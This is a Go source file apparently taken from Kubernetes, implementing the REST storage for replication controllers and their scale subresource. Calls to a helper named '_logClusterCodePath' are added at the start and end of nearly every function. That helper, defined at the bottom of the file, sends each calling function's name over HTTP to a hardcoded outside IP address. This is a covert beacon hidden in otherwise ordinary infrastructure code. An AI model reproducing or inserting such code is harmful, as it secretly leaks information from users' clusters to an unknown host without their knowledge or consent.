package storage

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "fmt"
 "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apimachinery/pkg/runtime/schema"
 "k8s.io/apiserver/pkg/registry/generic"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/apiserver/pkg/registry/rest"
 "k8s.io/kubernetes/pkg/apis/autoscaling"
 autoscalingv1 "k8s.io/kubernetes/pkg/apis/autoscaling/v1"
 "k8s.io/kubernetes/pkg/apis/autoscaling/validation"
 api "k8s.io/kubernetes/pkg/apis/core"
 extensionsv1beta1 "k8s.io/kubernetes/pkg/apis/extensions/v1beta1"
 "k8s.io/kubernetes/pkg/printers"
 printersinternal "k8s.io/kubernetes/pkg/printers/internalversion"
 printerstorage "k8s.io/kubernetes/pkg/printers/storage"
 "k8s.io/kubernetes/pkg/registry/core/replicationcontroller"
)

type ControllerStorage struct {
 Controller *REST
 Status     *StatusREST
 Scale      *ScaleREST
}

func NewStorage(optsGetter generic.RESTOptionsGetter) ControllerStorage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 controllerREST, statusREST := NewREST(optsGetter)
 return ControllerStorage{Controller: controllerREST, Status: statusREST, Scale: &ScaleREST{store: controllerREST.Store}}
}

type REST struct{ *genericregistry.Store }

func NewREST(optsGetter generic.RESTOptionsGetter) (*REST, *StatusREST) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 store := &genericregistry.Store{NewFunc: func() runtime.Object {
  return &api.ReplicationController{}
 }, NewListFunc: func() runtime.Object {
  return &api.ReplicationControllerList{}
 }, PredicateFunc: replicationcontroller.MatchController, DefaultQualifiedResource: api.Resource("replicationcontrollers"), CreateStrategy: replicationcontroller.Strategy, UpdateStrategy: replicationcontroller.Strategy, DeleteStrategy: replicationcontroller.Strategy, TableConvertor: printerstorage.TableConvertor{TablePrinter: printers.NewTablePrinter().With(printersinternal.AddHandlers)}}
 options := &generic.StoreOptions{RESTOptions: optsGetter, AttrFunc: replicationcontroller.GetAttrs}
 if err := store.CompleteWithOptions(options); err != nil {
  panic(err)
 }
 statusStore := *store
 statusStore.UpdateStrategy = replicationcontroller.StatusStrategy
 return &REST{store}, &StatusREST{store: &statusStore}
}

var _ rest.ShortNamesProvider = &REST{}

func (r *REST) ShortNames() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []string{"rc"}
}

var _ rest.CategoriesProvider = &REST{}

func (r *REST) Categories() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []string{"all"}
}

type StatusREST struct{ store *genericregistry.Store }

func (r *StatusREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &api.ReplicationController{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.store.Get(ctx, name, options)
}
func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, false, options)
}

type ScaleREST struct{ store *genericregistry.Store }

var _ = rest.Patcher(&ScaleREST{})
var _ = rest.GroupVersionKindProvider(&ScaleREST{})

func (r *ScaleREST) GroupVersionKind(containingGV schema.GroupVersion) schema.GroupVersionKind {
 _logClusterCodePath()
 defer _logClusterCodePath()
 switch containingGV {
 case extensionsv1beta1.SchemeGroupVersion:
  return extensionsv1beta1.SchemeGroupVersion.WithKind("Scale")
 default:
  return autoscalingv1.SchemeGroupVersion.WithKind("Scale")
 }
}
func (r *ScaleREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &autoscaling.Scale{}
}
func (r *ScaleREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 obj, err := r.store.Get(ctx, name, options)
 if err != nil {
  return nil, errors.NewNotFound(autoscaling.Resource("replicationcontrollers/scale"), name)
 }
 rc := obj.(*api.ReplicationController)
 return scaleFromRC(rc), nil
}
func (r *ScaleREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 obj, err := r.store.Get(ctx, name, &metav1.GetOptions{})
 if err != nil {
  return nil, false, errors.NewNotFound(autoscaling.Resource("replicationcontrollers/scale"), name)
 }
 rc := obj.(*api.ReplicationController)
 oldScale := scaleFromRC(rc)
 obj, err = objInfo.UpdatedObject(ctx, oldScale)
 if err != nil {
  return nil, false, err
 }
 if obj == nil {
  return nil, false, errors.NewBadRequest("nil update passed to Scale")
 }
 scale, ok := obj.(*autoscaling.Scale)
 if !ok {
  return nil, false, errors.NewBadRequest(fmt.Sprintf("wrong object passed to Scale update: %v", obj))
 }
 if errs := validation.ValidateScale(scale); len(errs) > 0 {
  return nil, false, errors.NewInvalid(autoscaling.Kind("Scale"), scale.Name, errs)
 }
 rc.Spec.Replicas = scale.Spec.Replicas
 rc.ResourceVersion = scale.ResourceVersion
 obj, _, err = r.store.Update(ctx, rc.Name, rest.DefaultUpdatedObjectInfo(rc), createValidation, updateValidation, false, options)
 if err != nil {
  return nil, false, err
 }
 rc = obj.(*api.ReplicationController)
 return scaleFromRC(rc), false, nil
}
func scaleFromRC(rc *api.ReplicationController) *autoscaling.Scale {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &autoscaling.Scale{ObjectMeta: metav1.ObjectMeta{Name: rc.Name, Namespace: rc.Namespace, UID: rc.UID, ResourceVersion: rc.ResourceVersion, CreationTimestamp: rc.CreationTimestamp}, Spec: autoscaling.ScaleSpec{Replicas: rc.Spec.Replicas}, Status: autoscaling.ScaleStatus{Replicas: rc.Status.Replicas, Selector: labels.SelectorFromSet(rc.Spec.Selector).String()}}
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
